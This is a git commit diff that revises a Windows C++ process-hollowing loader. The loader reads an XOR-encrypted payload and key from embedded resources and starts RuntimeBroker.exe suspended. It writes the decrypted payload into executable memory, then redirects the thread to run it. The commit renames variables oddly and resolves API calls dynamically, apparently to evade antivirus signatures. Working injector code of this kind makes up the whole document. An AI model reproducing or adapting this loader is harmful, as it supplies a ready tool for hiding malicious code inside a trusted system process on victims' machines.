0c9c5337f999101d9aa5d94a86b24d057ee8ded4
dhanush <114467712+dagowda@users.noreply.github.com>
2025-01-02 03:59:18 -0500

    Update hollow_dynamic.cpp

--- dummyda/hollow_dynamic.cpp
+++ dummyda/hollow_dynamic.cpp
@@ -1,3 +1,5 @@
+
+
 #include <windows.h>
 #include <tlhelp32.h>
 #include <wincrypt.h>
@@ -23,52 +25,51 @@ int main() {
     char* ke;
     DWORD keLen;
     its_load_re("dhanushkey1", &ke, &keLen);
-    const char* processPath = "C:\\Windows\\System32\\RuntimeBroker.exe";
+    const char* processptaah = "C:\\Windows\\System32\\RuntimeBroker.exe";
     char* code199k;
     DWORD code199kLen;
     its_load_re("dhanushcode56", &code199k, &code199kLen);
 
-    STARTUPINFO si = {0};
-    PROCESS_INFORMATION pi = {0};
+    STARTUPINFO li = {0};
     
-    si.cb = sizeof(si);
-    
-    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
-    
-    auto pCreateProcessA = (BOOL(WINAPI*)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION))GetProcAddress(hKernel32, "CreateProcessA");
-    pCreateProcessA(processPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
+  HMODULE istfromKernel32 = LoadLibraryA("kernel32.dll");
 
+    BOOL (*itscreatetPro)(
+        LPCSTR lpApplicationName,LPSTR lpCommandLine,LPSECURITY_ATTRIBUTES lpProcessAttributes,LPSECURITY_ATTRIBUTES lpThreadAttributes,BOOL bInheritHandles,DWORD dwCreationFlags,LPVOID lpEnvironment,LPCSTR lpCurrentDirectory,LPSTARTUPINFOA lpStartupInfo,
+        LPPROCESS_INFORMATION lpProcessInformation
+    ) = (BOOL(*)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION))
+        GetProcAddress(istfromKernel32, "CreateProcessA");
+
+  LPVOID (*pVirtualAllnocEkx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD) =
+    (LPVOID(*)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD))GetProcAddress(istfromKernel32, "VirtualAllocEx");
+    
+
+   BOOL (*pWriteProcessM)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*) =
+    (BOOL(*)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*))GetProcAddress(istfromKernel32, "WriteProcessMemory");
+     
+    PROCESS_INFORMATION pi = {0};
+    li.cb = sizeof(li);
+    
+    
+    itscreatetPro(processptaah, 0, 0, 0, FALSE,CREATE_SUSPENDED, 0, 0, &li, &pi);
+    GetTickCount();
+    
     CONTEXT ctx = {0};
+  
     ctx.ContextFlags = CONTEXT_FULL;
     
-    auto pGetThreadContext = (BOOL(WINAPI*)(HANDLE, LPCONTEXT))GetProcAddress(hKernel32, "GetThreadContext");
-    pGetThreadContext(pi.hThread, &ctx);
+    GetThreadContext(pi.hThread, &ctx);
 
-    auto pVirtualAllocEx = (LPVOID(WINAPI*)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD))GetProcAddress(hKernel32, "VirtualAllocEx");
-    LPVOID lpBase = pVirtualAllocEx(
-        pi.hProcess,
-        NULL,
-        code199kLen,
-        MEM_COMMIT | MEM_RESERVE,
-        PAGE_EXECUTE_READWRITE
-    );
-
-    auto pWriteProcessMemory = (BOOL(WINAPI*)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*))GetProcAddress(hKernel32, "WriteProcessMemory");
-    pWriteProcessMemory(pi.hProcess, lpBase, code199k, code199kLen, NULL);
-
+    LPVOID gallio = pVirtualAllnocEkx(pi.hProcess, NULL, code199kLen,MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    
     for (DWORD i = 0; i < code199kLen; i++) {
         code199k[i] ^= ke[i % keLen];
     }
+    pWriteProcessM(pi.hProcess, gallio, code199k, code199kLen, NULL);
+    ctx.Rcx = (DWORD64)gallio; 
+    SetThreadContext(pi.hThread, &ctx);
 
-    auto pSetThreadContext = (BOOL(WINAPI*)(HANDLE, LPCONTEXT))GetProcAddress(hKernel32, "SetThreadContext");
-    ctx.Rcx = (DWORD64)lpBase;
-    pSetThreadContext(pi.hThread, &ctx);
-    
-    auto pResumeThread = (DWORD(WINAPI*)(HANDLE))GetProcAddress(hKernel32, "ResumeThread");
-    pResumeThread(pi.hThread);
-
-    CloseHandle(pi.hThread);
-    CloseHandle(pi.hProcess);
+    ResumeThread(pi.hThread); 
 
     return 0;
 }
